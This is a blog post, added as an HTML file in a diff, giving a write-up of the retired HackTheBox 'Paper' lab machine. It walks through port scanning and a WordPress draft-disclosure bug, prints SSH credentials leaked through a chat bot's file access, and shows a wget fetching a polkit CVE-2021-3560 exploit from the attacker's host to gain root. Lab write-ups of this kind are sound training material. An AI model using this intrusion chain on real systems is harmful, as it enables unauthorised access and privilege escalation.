@@ -1,0 +1,138 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[HackTheBox] Paper Writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="I worked on the Paper active(now retired) machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.11.143 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2."><meta property="og:image" content><meta property="og:title" content="[HackTheBox] Paper Writeup"><meta property="og:description" content="I worked on the Paper active(now retired) machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.11.143 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2."><meta property="og:type" content="article"><meta property="og:url" content="/posts/21/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-06-20T18:11:56+09:00"><meta property="article:modified_time" content="2022-06-20T18:11:56+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[HackTheBox] Paper Writeup"><meta name=twitter:description content="I worked on the Paper active(now retired) machine of HackTheBox, so I will write its writeup.
+Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.11.143 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[HackTheBox] Paper Writeup</h1><div class=meta>Posted on Jun 20, 2022</div></div><nav id=TableOfContents><ol><li><a href=#port-scan>Port Scan</a></li><li><a href=#initial-shell>Initial shell</a></li><li><a href=#privilege-escalation-dwight---root>Privilege Escalation <code>dwight</code> -> <code>root</code></a></li><li><a href=#thoughts>Thoughts</a></li></ol></nav><section class=body><p>I worked on the Paper active(now retired) machine of HackTheBox, so I will write its writeup.</p><p><img src=/images/posts/21/label.png alt=label></p><h1 id=port-scan>Port Scan</h1><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.11.143
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_http-title: HTTP Server Test Page powered by CentOS
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_http-title: HTTP Server Test Page powered by CentOS
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-07-03T08:52:34
+| Not valid after:  2022-07-08T10:32:34
+| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
+|_SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+</code></pre><h1 id=initial-shell>Initial shell</h1><p>http://10.10.11.143/</p><p><img src=/images/posts/21/testpage.png alt=testpage></p><p>A vulnerability scan using nikto shows that the response header <code>x-backend-server</code> is set to the value <code>office.paper</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nikto -h 10.10.11.143
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.11.143
++ Target Hostname:    10.10.11.143
++ Target Port:        80
++ Start Time:         2022-06-07 23:36:06 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header &#39;x-backend-server&#39; found, with contents: office.paper
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/7.2.24
++ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
+</code></pre><p>Add <code>office.paper</code> to <code>/etc/hosts</code> and try to connect.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ cat /etc/hosts
+...
+10.10.11.143    office.paper
+...
+</code></pre><p><a href=http://office.paper>http://office.paper</a></p><p><img src=/images/posts/21/office.png alt=office></p><p>One user points out to another user&rsquo;s post to remove the secret in the draft content.</p><p><img src=/images/posts/21/comment.png alt=comment></p><p>A google survey reveals that Wordpress versions 5.2.3 and below are vulnerable to being viewed by unauthenticated users of private or draft posts. <a href=https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2>https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2</a></p><p>And if you look at the source of the page, you can see that the version of wordpress is 5.2.3.</p><p><img src=/images/posts/21/version.png alt=version></p><p>Display draft content at the following URL according to the POC.</p><p><a href="http://office.paper/?static=1">http://office.paper/?static=1</a></p><p><img src=/images/posts/21/secret.png alt=secret></p><p>To access the page for registering users in the chat system, add <code>chat.office.paper</code> to <code>/etc/hosts</code> and try to connect.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ cat /etc/hosts
+...
+10.10.11.143    chat.office.paper
+...
+</code></pre><p><a href=http://chat.office.paper/register/8qozr226AhkCHZdyY>http://chat.office.paper/register/8qozr226AhkCHZdyY</a></p><p>Register users on this page.</p><p><img src=/images/posts/21/chatregister.png alt=chatregister></p><p>If you look at the chat general channel, you can see that a bot called recyclops has been introduced.</p><p><img src=/images/posts/21/chatgeneral.png alt=chatgeneral></p><p>Usage of recyclops bot. It seems that you can use the function to browse the contents of the file and the function to list in the directory.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>How to use me ? :
+1. Small Talk:
+You can ask me how dwight&#39;s weekend was, or did he watched the game last night etc.
+eg: &#39;recyclops how was your weekend?&#39; or &#39;recyclops did you watched the game last night?&#39; or &#39;recyclops what kind of bear is the best?
+2. Joke:
+You can ask me Why the salesman crossed the road.
+eg: &#39;recyclops why did the salesman crossed the road?&#39;
+&lt;=====The following two features are for those boneheads, who still don&#39;t know how to use scp. I&#39;m Looking at you Kevin.=====&gt;
+For security reasons, the access is limited to the Sales folder.
+3. Files:
+eg: &#39;recyclops get me the file test.txt&#39;, or &#39;recyclops could you send me the file src/test.php&#39; or just &#39;recyclops file test.txt&#39;
+4. List:
+You can ask me to list the files
+5. Time:
+You can ask me to what the time is
+eg: &#39;recyclops what time is it?&#39; or just &#39;recyclops time&#39;
+</code></pre><p>The credentials are written in the bot&rsquo;s env file.</p><p><img src=/images/posts/21/env.png alt=env></p><p>Attempting to log in with SSH as user: <code>dwight</code>, pass: <code>Queenofblad3s!23</code> via SSH succeeds.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ ssh dwight@10.10.11.143
+The authenticity of host &#39;10.10.11.143 (10.10.11.143)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.143&#39; (ECDSA) to the list of known hosts.
+dwight@10.10.11.143&#39;s password: 
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
+[dwight@paper ~]$ id
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+[dwight@paper ~]$ cat /home/dwight/user.txt
+*************************
+</code></pre><h1 id=privilege-escalation-dwight---root>Privilege Escalation <code>dwight</code> -> <code>root</code></h1><p>Running <a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>linpeas</a> reveals that it is vulnerable to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3560">CVE-2021-3560</a>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+</code></pre><p>Privilege escalation is successful with this <a href=https://github.com/Almorabea/Polkit-exploit>POC code</a>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>[dwight@paper tmp]$ wget http://10.10.14.5:8000/CVE-2021-3560.py
+--2022-06-11 06:25:35--  http://10.10.14.5:8000/CVE-2021-3560.py
+Connecting to 10.10.14.5:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2434 (2.4K) [text/x-python]
+Saving to: ‘CVE-2021-3560.py’
+
+CVE-2021-3560.py                       100%[============================================================================&gt;]   2.38K  --.-KB/s    in 0s      
+
+2022-06-11 06:25:35 (164 MB/s) - ‘CVE-2021-3560.py’ saved [2434/2434]
+
+[dwight@paper tmp]$ python3 CVE-2021-3560.py 
+**************
+Exploit: Privilege escalation with polkit - CVE-2021-3560
+Exploit code written by Ahmad Almorabea @almorabea
+Original exploit author: Kevin Backhouse 
+For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
+**************
+[+] Starting the Exploit
+...
+[+] Timed out at: 0.008575001060240025
+[+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+bash: cannot set terminal process group (115633): Inappropriate ioctl for device
+bash: no job control in this shell
+[root@paper tmp]# id
+uid=0(root) gid=0(root) groups=0(root)
+[root@paper tmp]# cat /root/root.txt
+*************************
+</code></pre><h1 id=thoughts>Thoughts</h1><p>The process of taking the first shell was a bit annoying as it was in line with the actual scenario.</p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
